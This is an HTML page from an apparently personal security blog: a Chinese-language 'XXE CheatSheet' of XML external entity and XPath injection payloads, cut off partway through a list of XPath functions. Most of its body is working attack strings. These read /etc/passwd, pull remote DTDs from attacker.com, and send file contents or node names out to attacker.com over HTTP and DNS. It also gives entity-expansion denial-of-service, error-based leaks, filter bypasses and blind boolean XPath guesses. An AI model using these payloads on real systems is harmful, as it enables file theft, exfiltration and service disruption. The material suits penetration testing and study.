<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="XXE payloads and attack methods.">
<meta property="og:type" content="article">
<meta property="og:title" content="XXE CheatSheet">
<meta property="og:url" content="https://srpopty.github.io/2022/05/04/XXE-CheatSheet/index.html">
<meta property="og:site_name" content="Shadow Gallery">
<meta property="og:description" content="XXE payloads and attack methods.">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-05-04T09:01:54.000Z">
<meta property="article:modified_time" content="2022-05-04T09:01:54.000Z">
<meta property="article:author" content="Srpopty">
<meta property="article:tag" content="CheatSheet">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://srpopty.github.io/2022/05/04/XXE-CheatSheet/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true
  };
</script>

  <title>XXE CheatSheet | Shadow Gallery</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Shadow Gallery" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Shadow Gallery</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">Live in the shadow</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://srpopty.github.io/2022/05/04/XXE-CheatSheet/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Srpopty">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shadow Gallery">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          XXE CheatSheet
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-04 17:01:54" itemprop="dateCreated datePublished" datetime="2022-05-04T17:01:54+08:00">2022-05-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hack/" itemprop="url" rel="index"><span itemprop="name">Hack</span></a>
                </span>
            </span>

          
            <div class="post-description">XXE payloads and attack methods.</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><hr>
<h2 id="简介"><a href="# 简介" class="headerlink" title="简介"></a>简介</h2><p>XXE (XML External Entity, XML 外部实体)，在一个 XML 文档中，攻击者可以直接控制 DTD 中 XML 实体的定义，引用外部实体，导致 SSRF。</p>
<p>使用 XML 的地方有：</p>
<ul>
<li>文档格式 OOXML, ODF, PDF, RSS, DOCX…</li>
<li>图片格式 SVG, EXIF Headers…</li>
<li>配置文件</li>
<li>网络协议 WebDAV, CalDAV, XMLRPC, SOAP, REST, XMPP, SAML, XACML…</li>
</ul>
<p>XXE 特征：</p>
<ul>
<li>PHP: <code>simplexml_load_file</code>, <code>xml_parse</code>, <code>simplexml_load_string</code></li>
<li>Java: <code>DOM</code>, <code>SAX</code>, <code>JDOM</code>, <code>DOM4J</code></li>
<li>Python: <code>SAX</code>, <code>DOM</code>, <code>ElementTree</code></li>
</ul>
<blockquote>
<p>在某些 xml 解析器中，尽管禁用了外部实体，但是解析器会在 DTD 定义阶段就对 URL 进行请求，但是不会展开该实体。<br>libxml2.9.0 后默认不解析外部实体。<br>simplexml_load_file 旧版本默认解析外部实体，新版本要指定第三個参数 LIBXML_NOENT</p>
</blockquote>
<p>XXE 有以下几种利用方法（以文件读取为例）。</p>
<h3 id="普通实体"><a href="# 普通实体" class="headerlink" title="普通实体"></a>普通实体 </h3><p> 引用外部普通实体。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;c;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：元素类型主要有 PCDATA 和 CDATA 两种，PCDATA 中的文本会被当成 XML 解析，CDATA 中的文本则不会。定义 b 为 CDATA 来避免 &amp;c; 中出现特殊字符导致 XML 解析器解析失败而报错。<br>XML 中有 5 个预定义的实体：&amp;lt;，&amp;gt;，&amp;amp;，&amp;apos; 和 &amp;quot;，分别替换 &lt; &gt; &amp; ‘ 和 “。字符实体也可以直接通过 Ascii 码使用，例如 % 的实体为 &amp;#x25;。</p>
</blockquote>
<p>当要读取的文件中存在一些复杂的字符（例如 <code>/etc/fstab</code>），可能会引起 xml 解析器报错时，可以使用参数实体拼接绕过，如下所示。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA [&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/fstab&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">all</span> <span class="string">&quot;% start;% goodies;% end;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="参数实体外部 -DTD"><a href="# 参数实体外部 -DTD" class="headerlink" title="参数实体外部 DTD"></a>参数实体外部 DTD</h3><p>利用参数实体引用外部 DTD 文件。</p>
<blockquote>
<p>注意：参数实体只能在 DTD 中引用，不能在声明前引用，也不能在实体声明内部引用。</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % c <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % c;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;d;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>evil.dtd</code> 的内容如下。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="普通实体外部 -DTD"><a href="# 普通实体外部 -DTD" class="headerlink" title="普通实体外部 DTD"></a>普通实体外部 DTD</h3><p>通过普通实体引用外部 DTD 文件。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;d;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>evil.dtd</code> 的内容如下。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><p>通过定义数量巨大的实体可以造成 DOS 攻击。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT a (<span class="keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY a0 <span class="string">&quot;dos&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">a1</span> <span class="string">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">a2</span> <span class="string">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;a2;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>a2 会被扩展为很多 a1，每个 a1 又会被扩展为很多 a0，这样的嵌套扩展会严重拖慢 XML 解析器的速度。</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>外部实体引用可以访问一个 URL，造成 SSRF，通过 SSRF 可以读取文件，攻击内网等。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT a (<span class="keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;http://a.com/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XXE- 盲注"><a href="#XXE- 盲注" class="headerlink" title="XXE 盲注"></a>XXE 盲注 </h3><p> 无回显的情况下可以将数据通过 HTTP 发送到远程服务器。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % remote;</span></span><br><span class="line"><span class="meta">    % send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中 <code>evil.dtd</code> 的内容如下。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY &amp;#x25; <span class="keyword">payload</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://attacker.com/?data=% file;&#x27;&gt;&quot;</span>&gt;</span> </span><br><span class="line">% payload;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意要将 % 实体编码为 &amp;#x25;</p>
</blockquote>
<p>攻击流程：</p>
<ol>
<li>首先展开 <code>% remote;</code>，请求远程服务器中的 <code>evil.dtd</code>。</li>
<li>展开 <code>evil.dtd</code> 中的 <code>% payload;</code>。</li>
<li>展开 <code>evil.dtd</code> 中的 <code>% send;</code>。</li>
<li>展开 <code>% send;</code> 中的 <code>% file;</code>，读取文件。</li>
<li>最后调用 <code>% send;</code>，将展开的 <code>% file;</code> 发送到远程服务器中。</li>
</ol>
<blockquote>
<p>在 PHP 环境下可以将数据通过 base64 编码（利用 filter）通过 url 发送到远程服务器以避免 url 坏字符。</p>
</blockquote>
<h3 id="报错注入"><a href="# 报错注入" class="headerlink" title="报错注入"></a>报错注入 </h3><p> 类似 SQL 注入的报错注入，XXE 也可以通过报错注入返回一些额外信息，如下所示。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">NUMBER</span> <span class="string">&#x27;&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % NUMBER;</span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>a<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>以下 Payload 可能也会引起 XML 解析器错误：</p>
<ul>
<li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY err SYSTEM &#39;file:///some&#39;% pay; gif&gt;&quot;&gt; % trick;</code></li>
<li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY :% pay;&gt;&quot;&gt; % trick;</code></li>
<li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;% pay;&#39;&gt;&quot;&gt; % trick; % err;</code></li>
<li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY :% pay;&gt;&quot;&gt; % trick;</code></li>
<li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;% pay;&#39;&gt;&quot;&gt; % trick; % err;</code></li>
<li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;http% pay;:/127.0.0.1/&#39;&gt;&quot;&gt; % trick; % err;</code></li>
<li><code>&lt;!DOCTYPE html [&lt;!ENTITY % foo SYSTEM&quot;file:///c:/boot.ini&quot;&gt; % foo;]&gt;</code></li>
</ul>
<h3 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        &lt;![CDATA [&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; % dtd;]&gt;&lt;xxx/&gt;]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="其他 -Payload"><a href="# 其他 -Payload" class="headerlink" title="其他 Payload"></a>其他 Payload</h3><h2 id="绕过"><a href="# 绕过" class="headerlink" title="绕过"></a>绕过</h2><ul>
<li>可以用 <code>PUBLIC</code> 代替 <code>SYSTEM</code>，二者完全等价。</li>
<li>修改文档编码格式，例如 <code>UTF-7</code>，<code>UTF-16</code> 等。</li>
</ul>
<p>其他绕过方法：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE :. <span class="keyword">SYTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE :_-_: <span class="keyword">SYTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE &#123;0xdfbf&#125; <span class="keyword">SYSTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="XML- 注入"><a href="#XML- 注入" class="headerlink" title="XML 注入"></a>XML 注入 </h2><p> 类似 XSS 中的闭合标签 / 引号。程序将用户输入直接拼接到一个 XML 文档中时，可以通过闭合标签 / 引号的方式注入新的 XML 数据，控制 XML 文档。</p>
<h2 id="XPath- 注入"><a href="#XPath- 注入" class="headerlink" title="XPath 注入"></a>XPath 注入</h2><p>SQL 语言是为了从 SQL 数据库中获取数据而产生的语言，同样为了从 XML 文档中获取数据，产生了 XPath 查询语言。类似 SQL 注入，程序将用户输入直接拼接到一个 XPath 查询语句中，造成 XPath 注入，可以获取 XML 文档的数据，甚至控制 XML 文档。</p>
<p>例如有一个查询语句 <code>/root/users/user [username/text ()=&#39;attacker&#39; and password/text ()=&#39;yyyy&#39;]</code>，若攻击者将 <code>attacker</code> 替换为 <code>&#39; or 1=1 or &#39;&#39;=&#39;</code>，那么查询语句就变成了 <code>/root/users/user [username/text ()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39; and password/text ()=&#39;yyyy&#39;]</code>。该查询语句将一直返回 true，导致查询出所有的 user 信息，由于 XPath 不像 SQL 注入有很多访问控制，XPath 的注入没有太多的限制。</p>
<h3 id="盲注"><a href="# 盲注" class="headerlink" title="盲注"></a>盲注 </h3><h4 id="布尔盲注"><a href="# 布尔盲注" class="headerlink" title="布尔盲注"></a> 布尔盲注 </h4><p> 在无回显的情况下，XPath 也可以盲注。首先需要获取某个节点下子节点的数量。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or count (/*) = 1 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">&#x27; or count (/*) = 2 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">&#x27; or count (/*) = 3 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">&#x27; or count (/*) = 4 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>之后爆破出该节点的名字。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or substring (name (/*[position () = 1]),1,1)=&#x27;a&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">&#x27; or substring (name (/*[position () = 1]),1,1)=&#x27;b&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">&#x27; or substring (name (/*[position () = 1]),1,1)=&#x27;c&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">&#x27; or substring (name (/*[position () = 1]),1,1)=&#x27;d&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>利用同样的方法也可以爆破出节点的属性。</p>
<h4 id="HTTP- 外带"><a href="#HTTP- 外带" class="headerlink" title="HTTP 外带"></a>HTTP 外带 </h4><p> 在 XPath 2.0 中，提供一个 <code>doc</code> 函数，该函数可以从 web 服务器中请求一个 xml 文档，利用这个 HTTP 请求，可以将数据外带到 web 服务器中。下面的 payload 可以将根节点的名字外带到 web 服务器中。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or doc (concat (&quot;http://attacker.com/?data=&quot;, encode-foruri (/*[1]/name ()))) or &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>

<h4 id="DNS- 外带"><a href="#DNS- 外带" class="headerlink" title="DNS 外带"></a>DNS 外带 </h4><p> 同样可以利用 DNS 外带数据，下面的 payload 可以将根节点的名字外带到 DNS 服务器中。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or doc (concat (encode-foruri (/*[1]/name ()), &#x27;.attacker.com&#x27;)) or &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>

<h3 id="常用函数"><a href="# 常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul>
<li><code>count (/root/*)</code> 获取 <code>root</code> 节点下所有子节点的数量。</li>
<li><code>string-length (/*[1]/*[1]/name ())</code> 获取第一个节点下第一个节点的名字的长度。</li>
<li><code>substring (/*[1]/*[1]/name (), 1, 1)</code> 截取第一个节点下第一个节点的名字的第一个字符。</li>
<li><code>lower-case (&quot;A&quot;) =&quot;a&quot;</code> 用于判断 XPath 版本，此函数在 2.0 中才加入。</li>
<li><code>base-uri ()</code> 返回该 XML 文档文件的位置，XPath 2.0 加入。</li>
